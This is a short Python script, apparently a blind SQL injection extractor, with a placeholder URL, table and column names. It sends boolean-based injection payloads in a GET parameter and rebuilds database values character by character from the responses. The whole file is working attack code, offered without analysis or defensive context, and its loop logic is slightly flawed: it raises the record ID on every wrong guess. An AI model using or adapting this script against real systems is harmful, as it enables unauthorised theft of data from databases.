import requests
import string



url = ""


position = 1

data = ''

characters = string.ascii_letters + string.digits + string.digits + string.digits +  '''!"$%'()*+,-./:;<=>?@[\\]^_`{|}~'''
id = 1


while True:
    for character in characters:
        payload = f'''2' AND(SELECT SUBSTR(columns, {position}, 1) FROM table_name WHERE ID={id} LIMIT 1 OFFSET 0)= '{character}'-- -'''
        print(f'[+]Trying payload: {payload}', end = "\r")
        r = requests.get(f'{url}?something={payload}')
        if "Something" in r.text:
            data += "".join(character)
            print(f'[+] Found answer: {data} in question ID {id}, payload:{payload}', end = "\r")
            position += 1
            break
        else:
            print("Wrong")
            id += 1